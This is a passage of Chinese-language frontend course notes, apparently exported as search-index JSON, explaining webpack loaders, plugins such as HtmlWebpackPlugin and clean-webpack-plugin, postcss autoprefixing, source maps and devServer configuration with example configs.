<pre><code>//webpack.config.js\n{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\", \"postcss-loader\"]\n},\n</code></pre> <pre><code>//postcss.config.js\nmodule.exports = {\n  plugins: [\n    require(\"autoprefixer\")({\n      overrideBrowserslist: [\"last 2 versions\", \"&gt;1%\"] \n    })\n  ]\n};\n</code></pre> <p>loader \u5904\u7406webpack\u4e0d\u2f40\u6301\u7684\u683c\u5f0f\u2f42\u4ef6\uff0c\u6a21\u5757 \u2f00\u4e2aloader\u53ea\u5904\u7406\u2f00\u4ef6\u4e8b\u60c5</p> <p>loader\u6709\u6267\u2f8f\u987a\u5e8f\uff1bplugin \u53ef\u4ee5\u5728webpack\u8fd0\u2f8f\u5230\u67d0\u4e2a\u9636\u6bb5\u7684\u65f6\u5019\uff0c\u5e2e\u4f60\u505a\u2f00\u4e9b\u4e8b\u60c5\uff0c\u7c7b\u4f3c\u4e8e\u2f63\u751f\u547d\u5468\u671f\u7684\u6982\u5ff5</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#6plugins","title":"6.Plugins","text":"<ul> <li>\u4f5c\u2f64\u4e8ewebpack\u6253\u5305\u6574\u4e2a\u8fc7\u7a0b</li> <li>webpack\u7684\u6253\u5305\u8fc7\u7a0b\u662f\u6709(\u2f63\u547d\u5468\u671f\u6982\u5ff5)\u94a9\u2f26</li> </ul> <p>\u63d2\u4ef6\uff1a\u5728 Webpack \u6784\u5efa\u6d41\u7a0b\u4e2d\u7684\u7279\u5b9a\u65f6\u673a\u6ce8\u5165\u6269\u5c55\u903b\u8f91\u6765\u6539 \u53d8\u6784\u5efa\u7ed3\u679c\u6216\u505a\u4f60\u60f3\u8981\u7684\u4e8b\u60c5\u3002\u4f5c\u2f64\u4e8e\u6574\u4e2a\u6784\u5efa\u8fc7\u7a0b\u3002</p>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#61-htmlwebpackplugin","title":"6.1 HtmlWebpackPlugin","text":"<p>htmlwebpackplugin\u4f1a\u5728\u6253\u5305\u7ed3\u675f\u540e\uff0c\u2f83\u52a8\u751f\u6210\u2f00\u4e2ahtml\u2f42\u4ef6\uff0c\u5e76\u628a\u6253\u5305\u2f63\u6210\u7684js\u6a21\u5757\u5f15\u5165\u5230\u8be5html\u4e2d\u3002</p> <pre><code> npm install --save-dev html-webpack-plugin\n</code></pre> <p>\u914d\u7f6e:</p> <pre><code>title: \u2f64\u6765\u2f63\u751f\u6210\u2eda\u9875\u2faf\u7684 title \u5143\u7d20\n\nfilename: \u8f93\u51fa\u7684 HTML \u2f42\u4ef6\u540d\uff0c\u9ed8\u8ba4\u662f index.html, \u4e5f\u53ef\u4ee5\u76f4 \u63a5\u914d\u7f6e\u5e26\u6709\u2f26\u5b50\u2f6c\u5f55\u3002\n\ntemplate: \u6a21\u677f\u2f42\u4ef6\u8def\u5f84\uff0c\u2f40\u6301\u52a0\u8f7d\u5668\u5668\uff0c\u2f50\u5982 html!./index.html\n\ninject: true | 'head' | 'body' | false ,\u6ce8\u5165\u6240\u6709\u7684\u8d44 \u6e90\u5230\u7279\u5b9a\u7684 template \u6216\u8005 templateContent \u4e2d\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true \u6216\u8005 body\uff0c\u6240\u6709\u7684 javascript \u8d44\u6e90\u5c06\u88ab\u653e\u7f6e\u5230 body \u5143 \u7d20\u7684\u5e95\u90e8\uff0c'head' \u5c06\u653e\u7f6e\u5230 head \u5143\u7d20\u4e2d\u3002\n\nfavicon: \u6dfb\u52a0\u7279\u5b9a\u7684 favicon \u8def\u5f84\u5230\u8f93\u51fa\u7684 HTML \u2f42\u4ef6\u4e2d\u3002 minify: {} | false , \u4f20\u9012 html-minifier \u9009\u9879\u7ed9 minify \u8f93\u51fa\n\nhash: true | false, \u5982\u679c\u4e3a true, \u5c06\u6dfb\u52a0\u2f00\u4e2a\u552f\u2f00\u7684 webpack \u7f16\u8bd1 hash \u5230\u6240\u6709\u5305\u542b\u7684\u811a\u672c\u548c CSS \u2f42\u4ef6\uff0c\u5bf9\u4e8e\u89e3\u9664 cache \u5f88\u6709\u2f64\u3002\n\ncache: true | false\uff0c\u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u4ec5\u4ec5\u5728\u2f42\u4ef6 \u4fee\u6539\u4e4b\u540e\u624d\u4f1a\u53d1\u5e03\u2f42\u4ef6\u3002\n\nshowErrors: true | false, \u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u9519\u8bef \u4fe1\u606f\u4f1a\u5199\u5165\u5230 HTML \u2eda\u9875\u2faf\u4e2d\n\nchunks: \u5141\u8bb8\u53ea\u6dfb\u52a0\u67d0\u4e9b\u5757 (\u2f50\u5982\uff0c\u4ec5\u4ec5 unit test \u5757) chunksSortMode: \u5141\u8bb8\u63a7\u5236\u5757\u5728\u6dfb\u52a0\u5230\u2eda\u9875\u2faf\u4e4b\u524d\u7684\u6392\u5e8f\u2f45\u65b9\u5f0f\uff0c\u2f40\u6301 \u7684\u503c:'none' | 'default' | {function}-default:'auto' excludeChunks: \u5141\u8bb8\u8df3\u8fc7\u67d0\u4e9b\u5757\uff0c(\u2f50\u5982\uff0c\u8df3\u8fc7\u5355\u5143\u6d4b\u8bd5\u7684\u5757)\n</code></pre> <p>\u6848\u4f8b:</p> <pre><code>const path = require(\"path\");\nconst htmlWebpackPlugin = require(\"html-webpack-plugin\");\n</code></pre> <pre><code>module.exports = {\n  plugins: [\n    new htmlWebpackPlugin({\n      title: \"My App\",\n      filename: \"app.html\",\n      template: \"./src/index.html\"\n    })\n  ]\n};\n</code></pre> <pre><code>//index.html\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\"content=\"ie=edge\" /&gt;\n    &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;\n      &lt;/head&gt;\n   &lt;body&gt;\n     &lt;div id=\"root\"&gt;&lt;/div&gt;\n   &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/12-webpack-01/#62-clean-webpack-plugin","title":"6.2 clean-webpack-plugin","text":"<p>\u7528\u4e8e\u6e05\u7a7a dist \u4e2d\u5df2\u6709\u7684\u6587\u4ef6</p> <pre><code>npm install --save-dev clean-webpack-plugin\n</code></pre> <pre><code>const { CleanWebpackPlugin } = require(\"clean-webpack-plugin\");\n</code></pre> <pre><code>plugins: [\n  new CleanWebpackPlugin()\n]\n</code></pre> <p>\u7b14\u8bb0\uff1a</p> <p>hash \u76ee\u7684\u662f\u6d4f\u89c8\u5668\u7f13\u5b58</p> <p>hash: \u6bcf\u6b21\u66f4\u65b0\u6587\u4ef6\uff0c\u5168\u90e8\u7684 bundle \u540d\u79f0\u90fd\u4f1a\u66f4\u65b0</p> <p>Chunkhash\uff1a\u5982\u679c\u4e00\u90e8\u5206\u6587\u4ef6\u53d8\u5316\uff0c\u90a3\u4e48\u4e0e\u4e4b\u76f8\u5173\u7684 bundle \u7684\u540d\u79f0\u4f1a\u66f4\u65b0\uff0c\u4e0d\u53d8\u7684 bundle \u4e0d\u4f1a\u66f4\u65b0\uff08\u9002\u7528\u4e8e\u591a\u5165\u53e3\u7684\u9879\u76ee\uff09</p> <p>\u901a\u5e386\u4f4dhash\u5c31\u6ca1\u95ee\u9898\u4e86\uff0c\u57fa\u672c\u4e0d\u4f1a\u51b2\u7a81</p> <p>Michael18811380328 \u7684\u754c\u9762\u4e2d\uff0c\u4f7f\u7528 webpack \u628a JS \u90e8\u5206\u6253\u5305\u4e00\u4e0b\uff1b\u8fd9\u6837\u4e5f\u987a\u4fbf\u7ec3\u4e60\u4e86</p> <p>\u7ec3\u4e60\u4ee3\u7801</p> <pre><code>const path = require('path');\nmodule.exports = {\n  // \u6253\u5305\u7684\u4e0a\u4e0b\u6587\uff08\u9879\u76ee\u6253\u5305\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u901a\u5e38\u4f7f\u7528\u9ed8\u8ba4\u7684\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u6539\u52a8\uff09\n  // content: process.cwd(),\n  entry: './src/index.js',\n  // entry: [\"./src/index.js\", \"./src/main.js\"]\n  // entry: { index: './src/index.js', other: './src/other.js' },\n  output: {\n    path: path.reolve(__dirname, \"./dist\"),\n    filename: \"[name]-[chunkhash:6]-[hash:6].js\"\n  },\n  mode: \"development\",\n  module: {\n    rules: [\n      {\n        test: /\\.css$/,\n        // loader \u4ece\u540e\u5411\u524d\u89e3\u6790\n        // css loader \u662f\u628a CSS\u6587\u4ef6\u7684\u5185\u5bb9\u52a0\u5165\u5230 js \u6a21\u5757\u4e2d\n        // style-loader \u662f\u628a js \u4e2d\u7684\u4ee3\u7801\uff0c\u8f6c\u6362\u5230 HTML \u4e2d style \u6807\u7b7e\u4e2d(css in js)\n        use: [\"style-loader\", \"css-loader\"]\n      },\n    ],\n  },\n};\n</code></pre> <p>output \u4e2d\u5360\u4f4d\u7b26</p> <ul> <li>Hash: \u6574\u4e2a\u9879\u76ee\u7684 hash \u503c\uff0c\u6bcf\u6b21\u6784\u5efa\u4e00\u6b21\uff0c\u90fd\u4f1a\u6709\u65b0\u7684 hash</li> <li>chunkhash\uff1a\u6839\u636e\u4e0d\u540c\u7684\u5165\u53e3\u8fdb\u884c\u4f9d\u8d56\u89e3\u6790\uff0c\u6784\u5efa\u5bf9\u5e94\u7684 chunk, \u751f\u6210\u5bf9\u5e94\u7684 hash\u3002\u5982\u679c entry \u6a21\u5757\u6ca1\u6709\u5185\u5bb9\u6539\u52a8\uff0c\u5219\u5bf9\u5e94\u7684 hash \u4e0d\u53d8</li> <li>name: \u6587\u4ef6\u540d\uff0cbundle \u7684\u6587\u4ef6\u540d\u548c\u5165\u53e3\u7684 key \u4e00\u81f4</li> </ul>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/","title":"Webpack-Day2","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 22979  \u9605\u8bfb46\u5206\u949f</p> <p>2021-10-26</p> <p>\u8bb2\u5e08\u7684\u6280\u672f\u7ec6\u8282\u548c\u914d\u7f6e\u8bb2\u7684\u4e00\u822c\uff0c\u8bfe\u7a0b\u7ffb\u8f66\u4e24\u6b21\uff0c\u6700\u540e\u4e00\u5b9a\u4ee5\u5b98\u7f51\u914d\u7f6e\u4e3a\u51c6\uff0c\u6700\u597d\u81ea\u5df1\u5b9e\u8df5\u4e00\u4e0b</p> <p>Style-loader \u7684\u914d\u7f6e\u53ef\u80fd\u66f4\u6539\u4e86\uff0c\u4e00\u5207\u4ee5\u5b98\u65b9\u6587\u6863\u4e3a\u51c6\uff0c\u4e0d\u7528\u7248\u672c\u9700\u8981\u53c2\u8003\u4e0d\u540c\u7684\u5b98\u65b9\u6587\u6863</p> <pre><code>{\n  test: /\\.less$/,\n  use: [\n    {\n      loader: \"style-loader\",\n      options: {\n        esModule: true, // css modules\n      }\n    },\n    {\n      loader: \"css-loader\",\n      options: {\n        modules: true,\n      }\n    },\n    \"less-loader\"\n  ],\n}\n</code></pre> <p>\u8be6\u89c1 github.com/webpack-contrib/css-loader \u9ed8\u8ba4 modules \u5c5e\u6027\u662f false\uff08\u4e3a\u4e86\u6027\u80fd\uff09\uff0c\u53ef\u4ee5\u8bbe\u7f6e true \u628aCSS\u5355\u72ec\u6a21\u5757\u5316\uff08\u4fbf\u4e8e\u8c03\u8bd5\uff09\u3002</p> <p>\u4e3b\u8981\u5185\u5bb9\uff1a</p> <ul> <li>CSS \u7684\u5e38\u89c1 loader\uff0cpostCSS \u505a\u6d4f\u89c8\u5668\u517c\u5bb9</li> <li>\u6587\u4ef6\u7684 loader\uff08\u5b57\u4f53\u3001\u56fe\u7247\uff09</li> <li>HTML \u63d2\u4ef6\uff08html-webpack-plugin\uff09</li> <li>sourceMap\u2014\u2014\u5e2e\u52a9\u6211\u4eec\u5728\u5f00\u53d1\u65f6\u8fdb\u884c\u8c03\u8bd5\uff08\u663e\u793a\u62a5\u9519\u4f4d\u7f6e\uff09\u751f\u4ea7\u73af\u5883\u4e0d\u5f00\u542f sourceMap\uff0c\u5f00\u53d1\u73af\u5883\u9ed8\u8ba4\u5f00\u542f\uff08cheap-inline-source-map\uff09\u4e0d\u663e\u793a source-map\u3002\u7ebf\u4e0a\u907f\u514d\u66b4\u9732\u6e90\u4ee3\u7801\u3002</li> <li>webpack-dev-server \u672c\u5730\u5f00\u53d1\u670d\u52a1\u5668-socket \u5b9e\u73b0\u70ed\u66f4\u65b0</li> </ul>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#post-css","title":"post-css","text":"<p>\u4f5c\u7528\uff1a\u81ea\u52a8\u517c\u5bb9\u65e9\u671f\u6d4f\u89c8\u5668</p> <p>\u5b89\u88c5\u4f9d\u8d56</p> <pre><code>npm install -D postcss-loader autoprefixer\n</code></pre> <p>\u66f4\u6539 CSS \u6587\u4ef6\u7684 loader</p> <pre><code>{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\", \"postcss-loader\"]\n}\n</code></pre> <p>\u9700\u8981\u5199\u4e00\u4e2a\u5355\u72ec\u7684\u914d\u7f6e\u6587\u4ef6 postcss.config.js</p> <p>\u7b2c\u4e00\u4e2a\u8868\u793a\u517c\u5bb9\u5404\u5927\u6d4f\u89c8\u5668\u6700\u8fd1\u7684\u4e24\u4e2a\u5927\u7248\u672c\u6d4f\u89c8\u5668\uff0c\u7b2c\u4e8c\u4e2a\u503c\u5e02\u573a\u5360\u6709\u7387\u5927\u4e8e1%\u7684\u6d4f\u89c8\u5668</p> <p>require('autoprefixer') \u5f15\u5165\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08\u65b9\u6cd5\uff09\uff0c\u6240\u4ee5\u76f4\u63a5\u4f20\u9012\u4e00\u4e2a\u5bf9\u8c61</p> <pre><code>module.exports = {\n  plugins: [\n    require('autoprefixer')({\n      overrideBrowserslist: [\"last 2 versions\", \"&gt;1%\"]\n    })\n  ]\n};\n\n// \u6216\u8005\u5199\u6210\u4e00\u822c\u5f62\u5f0f\nconst autoprefixer = require(\"autoprefixer\");\nautoprefixer({\n  overrideBrowerslist: [\"last 2 versions\", \"&gt;1%\"]\n})\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#file-loader","title":"File-loader","text":"<p>\u4f5c\u7528\uff1a\u628a\u6587\u4ef6\uff08\u6a21\u5757\uff09\u4ece\u6e90\u4ee3\u7801\u90e8\u5206\uff0c\u79fb\u52a8\u5230\u6253\u5305\u7684\u76ee\u5f55</p> <p>\u901a\u5e38\u662f\u5b57\u4f53\u56fe\u6807 txt svg cvs \u5927\u56fe\u7247\u7b49\u6587\u4ef6</p> <pre><code>import pic from './images/logo.png';\n\n// \u5b9e\u9645\u4e0a pic \u5c31\u662f\u6587\u4ef6\u7684\u8def\u5f84\nvar img = new Image();\nimg.src = pic;\nvar root = document.getElementById('Root');\nroot.append(img);\n</code></pre> <p>\u90a3\u4e48\u6211\u4eec\u9700\u8981\u4f7f\u7528 file-loader</p> <pre><code>{\n  test: /\\.(png|jpe?g|tiff|gif)$/,\n  use: {\n    loader: \"file-loader\",\n    options: {\n      name: \"[name]-[hash:6].[ext]\"\n    }\n  }\n}\n</code></pre> <p>Url-loader \u548c file-loader \u529f\u80fd\u7c7b\u4f3c\uff0c\u4e3b\u8981\u652f\u6301 limit \u53c2\u6570\uff0c\u4e0d\u540c\u5927\u5c0f\u7684\u6587\u4ef6\u4f7f\u7528\u4e0d\u540c\u7684\u5904\u7406\u65b9\u6cd5</p> <p>\u5c0f\u4f53\u79ef\u7684\u56fe\u7247\u8d44\u6e90\u53ef\u4ee5\u8f6c\u6362\u6210 base64 \u7136\u540e\u76f4\u63a5\u5199\u5165 js \u6587\u4ef6</p> <pre><code>{\n  test: /\\.(png|tiff)$/,\n  use: {\n    loader: 'url-loader',\n    options: {\n      name: \"[name]-[hash:12].[ext]\",\n      outputPath: \"images/\",\n      limit: 2 * 1024,\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#html-webpack-plugin","title":"HTML-webpack-plugin","text":"<p>\u63d2\u4ef6\uff0c\u7528\u4e8e\u628a\u6e90\u4ee3\u7801\u4e2d HTML \u66f4\u6539\u79fb\u52a8\u5230\u6253\u5305\u76ee\u5f55\u4e2d</p> <pre><code>{\n  plugins: [\n    new CleanWebpackPlugin(),\n    new HtmlWebpackPlugin({\n      title: \"\u7528\u4e8e\u4f20\u53c2\u7684\u90e8\u5206\"\n      template: \"./src/index.html\",\n      filename: \"index.html\",\n    })\n  ]\n}\n</code></pre> <p>\u6a21\u677f\u662f\u6e90\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\uff0c\u652f\u6301 cjs \u8fdb\u884c\u4f20\u53c2\uff0c\u9002\u7528\u4e8e\u591a\u4e2a HTML \u4f20\u53c2\uff0cfilename \u662f\u8f6c\u6362\u540e\u7684\u6587\u4ef6\u540d</p>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#source-map","title":"source-map","text":"<p>\u662f\u5426\u663e\u793a\u6253\u5305\u540e\u7684\u4e0d\u540c\u6587\u4ef6\u7684\u4f9d\u8d56\u5173\u7cfb</p> <p>\u9ed8\u8ba4\u751f\u4ea7\u73af\u5883\u4e0b\u9762\u4e0d\u663e\u793a\uff08\u4e3a\u4e86\u6027\u80fd\uff0c\u6e90\u4ee3\u7801\u4fdd\u5bc6\uff09\uff0c\u5f00\u53d1\u73af\u5883\u4e0b\u9762\u663e\u793a\uff08\u4e3a\u4e86\u8c03\u8bd5\u65b9\u4fbf\uff09</p> <pre><code>{\n  devtool: \"source-map\"\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#devserver","title":"devServer","text":"<p>\u5f00\u542f\u672c\u5730\u5f00\u53d1\u670d\u52a1\u5668\uff0c\u4fbf\u4e8e\u8c03\u8bd5</p> <pre><code>{\n  devServer: {\n    contentBase: path.resolved(__dirname, \"./dist\"), // \u672c\u5730\u9879\u76ee\u76ee\u5f55\n    open: true, // \u662f\u5426\u81ea\u52a8\u6253\u5f00\u6d4f\u89c8\u5668\n    port: 8080,\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#mini-css-extract","title":"Mini-css-extract","text":"<p>\u63d2\u4ef6\uff0c\u7528\u4e8e\u62bd\u53d6 css \u5230\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\u3002\u4f7f\u7528\u63d2\u4ef6\u65f6\uff0c\u9700\u8981\u6539\u53d8 css loader </p> <pre><code>{\n  rules: {\n    test: '/\\.css$',\n    use: [\n      MiniCssExtractPlugin.loader, // \u4e0d\u4f7f\u7528 style-loader\n      {\n        loader: \"css-loader\",\n        options: {\n          modules: true,\n        }\n      }\n    ]\n  },\n  // ...\n    plugins: [\n    new MiniCSSExtract({\n      filename: \"[name].css\"\n    })\n  ],\n}\n</code></pre> <p>\u539f\u59cb\u8bfe\u7a0b\u7b14\u8bb0\uff08\u7ed3\u6784\u6bd4\u8f83\u4e71\uff09</p> <p>\u4f5c\u4e1a:</p> <p>webpack\u2f40\u6301\u7b2c\u4e09\u2f45\u5b57\u4f53!!!!!!!</p> <ul> <li>loader: file-loader:\u5904\u7406\u9759\u6001\u8d44\u6e90\u6a21\u5757\uff1a\u539f\u7406\u662f\u628a\u6253\u5305\u2f0a\u2f1d\u4e2d\u8bc6\u522b\u51fa\u7684\u8d44\u6e90\u6a21\u5757\uff0c\u79fb\u52a8\u5230\u8f93\u51fa\u2f6c\u5f55\uff0c\u5e76\u4e14\u8fd4\u56de\u2f00\u4e2a\u5730\u5740\u540d\u79f0</li> </ul> <p>\u4f7f\u7528\u573a\u666f:\u5c31\u662f\u5f53\u6211\u4eec\u9700\u8981\u6a21\u5757\uff0c\u4ec5\u4ec5\u662f\u4ece\u6e90\u4ee3\u7801\u632a\u79fb\u5230\u6253\u5305\u2f6c\u5f55\uff0c \u5c31\u53ef\u4ee5\u4f7f\u2f64file-loader\u6765\u5904\u7406\uff0ctxt\uff0csvg\uff0ccsv\uff0cexcel\uff0c\u56fe\u2f5a\u8d44 \u6e90\u5566\u7b49\u7b49</p> <pre><code>npm install file-loader -D\n</code></pre> <p>\u6848\u4f8b:</p> <pre><code>module: {\n  rules: [\n    {\n      test: /\\.(png|jpe?g|gif)$/, //use\u4f7f\u2f64\u2f00\u4e2aloader\u53ef\u4ee5\u2f64\u5bf9\u8c61\uff0c\u5b57\u7b26\u4e32\uf905\uff0c\u4e24\u4e2aloader\u9700\u8981\u2f64\u6570\u7ec4\n      use: {\n        loader: \"file-loader\",\n        // options\u989d\u5916\u7684\u914d\u7f6e\uff0c\u2f50\u6bd4\u5982\u8d44\u6e90\u540d\u79f0\n        options: {\n          // placeholder \u5360\u4f4d\u7b26 [name]\u8001\u8d44\u6e90\u6a21\u5757\u7684\u540d\u79f0\n          // [ext]\u8001\u8d44\u6e90\u6a21\u5757\u7684\u540e\u7f00\n          // https://webpack.js.org/loaders/file-loader#placeholders\n          name: \"[name]_[hash].[ext]\", //\u6253\u5305\u540e\u7684\u5b58\u653e\u4f4d\u7f6e\n          outputPath: \"images/\"\n        }\n      }\n    }\n  ]\n},\n</code></pre> <p>\u5b9e\u4f8b</p> <pre><code>import pic from \"./logo.png\";\nvar img = new Image();\nimg.src = pic;\nimg.classList.add(\"logo\");\nvar root = document.getElementById(\"root\");\nroot.append(img);\n</code></pre> <p>\u5904\u7406\u5b57\u4f53 https://www.iconfont.cn/?spm=a313x.7781069.199 8910419.d4d0a486a</p> <pre><code>@font-face {\n  font-family: \"webfont\";\n  font-display: swap;\n  src: url(\"webfont.woff2\") format(\"woff2\");\n}\n\nbody {\n  background: blue;\n  font-family: \"webfont\" !important;\n}\n</code></pre> <pre><code>//webpack.config.js\n{\n  test: /\\.(eot|ttf|woff|woff2|svg)$/,\n  use: \"file-loader\"\n}\n</code></pre> <ul> <li>url-loader file-loader\u52a0\u5f3a\u7248\u672c</li> </ul> <p>url-loader\u5185\u90e8\u4f7f\u2f64\u4e86file-loader,\u6240\u4ee5\u53ef\u4ee5\u5904\u7406file-loader\u6240\u6709 \u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u9047\u5230jpg\u683c\u5f0f\u7684\u6a21\u5757\uff0c\u4f1a\u628a\u8be5\u56fe\u2f5a\u8f6c\u6362\u6210base64\u683c \u5f0f\u5b57\u7b26\u4e32\uf905\uff0c\u5e76\u6253\u5305\u5230js\u91cc\u3002\u5bf9\u2f29\u5c0f\u4f53\u79ef\u7684\u56fe\u2f5a\u2f50\u6bd4\u8f83\u5408\u9002\uff0c\u2f24\u5927\u56fe\u2f5a\u4e0d \u5408\u9002\u3002</p> <pre><code> npm install url-loader -D\n</code></pre> <p>\u6848\u4f8b;</p> <pre><code>module: {\n  rules: [\n    {\n      test: /\\.(png|jpe?g|gif)$/,\n      use: {\n        loader: \"url-loader\",\n        options: {\n          name: \"[name]_[hash].[ext]\",\n          outputPath: \"images/\", //\u2f29\u5c0f\u4e8e2048\uff0c\u624d\u8f6c\u6362\u6210base64\n          limit: 2048\n        } }\n    } ]\n},\n</code></pre> <p>\u6837\u5f0f\u5904\u7406:</p> <p>Css-loader \u5206\u6790css\u6a21\u5757\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5e76\u5408\u6210\u2f00\u4e2acss Style-loader \u4f1a\u628acss-loader\u2f63\u6210\u7684\u5185\u5bb9\uff0c\u4ee5style\u6302\u8f7d\u5230\u2eda\u2faf\u7684</p> <p>heade\u90e8\u5206</p> <pre><code>npm install style-loader css-loader -D\n</code></pre> <pre><code>{\n  test: /\\.css$/,\n    use: [\"style-loader\", \"css-loader\"]\n\n}\n\n{\n  test:/\\.css$/,\n    use:[{\n      loader:\"style-loader\",\n      options: {\n        injectType: \"singletonStyleTag\" // \u5c06\u6240 \u6709\u7684style\u6807\u7b7e\u5408\u5e76\u6210\u2f00\u4e2a\n      }\n    },\"css-loader\"]\n}\n</code></pre> <ul> <li>Less\u6837\u5f0f\u5904\u7406\uff1aless-loader \u628aless\u8bed\u6cd5\u8f6c\u6362\u6210css</li> </ul> <pre><code> $ npm install less less-loader --save-dev\n</code></pre> <p>\u6848\u4f8b: loader\u6709\u987a\u5e8f\uff0c\u4ece\u53f3\u5230\u5de6\uff0c\u4ece\u4e0b\u5230\u4e0a</p> <pre><code>{\n  test: /\\.scss$/,\n  use: [\"style-loader\", \"css-loader\", \"less-loader\"]\n}\n</code></pre> <p>\u6837\u5f0f\u2f83\u81ea\u52a8\u6dfb\u52a0\u524d\u7f00:</p> <p>https://caniuse.com/</p> <p>Postcss-loader</p> <pre><code> npm i  postcss-loader autoprefixer -D\n</code></pre> <p>\u65b0\u5efapostcss.config.js</p> <p><pre><code>//webpack.config.js\n{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\", \"postcss-\nloader\"]\n},\n</code></pre> <pre><code>//postcss.config.js\nmodule.exports = {\n  plugins: [\n    require(\"autoprefixer\")({\n      overrideBrowserslist: [\"last 2 versions\",\"&gt;1%\"] })\n  ]\n};\n</code></pre></p> <p>loader \u5904\u7406webpack\u4e0d\u2f40\u6301\u7684\u683c\u5f0f\u2f42\u4ef6\uff0c\u6a21\u5757 \u2f00\u4e2aloader\u53ea\u5904\u7406\u2f00\u4ef6\u4e8b\u60c5  loader\u6709\u6267\u884c\u987a\u5e8f</p> <p>5.Plugins</p> <p>\u4f5c\u2f64\u4e8ewebpack\u6253\u5305\u6574\u4e2a\u8fc7\u7a0b webpack\u7684\u6253\u5305\u8fc7\u7a0b\u662f\u6709(\u2f63\u547d\u5468\u671f\u6982\u5ff5)\u94a9\u2f26\u5b50</p> <p>plugin \u53ef\u4ee5\u5728webpack\u8fd0\u884c\u5230\u67d0\u4e2a\u9636\u6bb5\u7684\u65f6\u5019\uff0c\u5e2e\u4f60\u505a\u2f00\u4e9b\u4e8b\u60c5\uff0c \u7c7b\u4f3c\u4e8e\u2f63\u547d\u5468\u671f\u7684\u6982\u5ff5</p> <p>\u6269\u5c55\u63d2\u4ef6\uff0c\u5728 Webpack \u6784\u5efa\u6d41\u7a0b\u4e2d\u7684\u7279\u5b9a\u65f6\u673a\u6ce8\u2f0a\u6269\u5c55\u903b\u8f91\u6765\u6539 \u53d8\u6784\u5efa\u7ed3\u679c\u6216\u505a\u4f60\u60f3\u8981\u7684\u4e8b\u60c5\u3002</p> <p>\u4f5c\u2f64\u4e8e\u6574\u4e2a\u6784\u5efa\u8fc7\u7a0b</p> <p>HtmlWebpackPlugin</p> <p>htmlwebpackplugin\u4f1a\u5728\u6253\u5305\u7ed3\u675f\u540e\uff0c\u2f83\u81ea\u52a8\u2f63\u6210\u2f00\u4e2ahtml\u2f42\u4ef6\uff0c\u5e76 \u628a\u6253\u5305\u2f63\u6210\u7684js\u6a21\u5757\u5f15\u2f0a\u5230\u8be5html\u4e2d\u3002</p> <pre><code> npm install --save-dev html-webpack-plugin\n</code></pre> <p>\u914d\u7f6e:</p> <pre><code>title: \u2f64\u6765\u2f63\u6210\u2eda\u2faf\u7684 title \u5143\u7d20\n filename: \u8f93\u51fa\u7684 HTML \u2f42\u4ef6\u540d\uff0c\u9ed8\u8ba4\u662f index.html, \u4e5f\u53ef\u4ee5\u76f4 \u63a5\u914d\u7f6e\u5e26\u6709\u2f26\u5b50\u2f6c\u5f55\u3002\n template: \u6a21\u677f\u2f42\u4ef6\u8def\u8def\u5f84\uff0c\u2f40\u6301\u52a0\u8f7d\u5668\u5668\uff0c\u2f50\u6bd4\u5982 html!./index.html\n inject: true | 'head' | 'body' | false ,\u6ce8\u2f0a\u6240\u6709\u7684\u8d44 \u6e90\u5230\u7279\u5b9a\u7684 template \u6216\u8005 templateContent \u4e2d\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true \u6216\u8005 body\uff0c\u6240\u6709\u7684 javascript \u8d44\u6e90\u5c06\u88ab\u653e\u7f6e\u5230 body \u5143 \u7d20\u7684\u5e95\u90e8\uff0c'head' \u5c06\u653e\u7f6e\u5230 head \u5143\u7d20\u4e2d\u3002\n favicon: \u6dfb\u52a0\u7279\u5b9a\u7684 favicon \u8def\u8def\u5f84\u5230\u8f93\u51fa\u7684 HTML \u2f42\u4ef6\u4e2d\u3002 minify: {} | false , \u4f20\u9012 html-minifier \u9009\u9879\u7ed9 minify \u8f93\u51fa\n hash: true | false, \u5982\u679c\u4e3a true, \u5c06\u6dfb\u52a0\u2f00\u4e2a\u552f\u2f00\u7684 webpack \u7f16\u8bd1 hash \u5230\u6240\u6709\u5305\u542b\u7684\u811a\u672c\u548c CSS \u2f42\u4ef6\uff0c\u5bf9\u4e8e\u89e3\u9664 cache \u5f88\u6709\u2f64\u3002\n cache: true | false\uff0c\u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u4ec5\u4ec5\u5728\u2f42\u4ef6 \u4fee\u6539\u4e4b\u540e\u624d\u4f1a\u53d1\u5e03\u2f42\u4ef6\u3002\n showErrors: true | false, \u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u9519\u8bef \u4fe1\u606f\u4f1a\u5199\u2f0a\u5230 HTML \u2eda\u2faf\u4e2d\n chunks: \u5141\u8bb8\u53ea\u6dfb\u52a0\u67d0\u4e9b\u5757 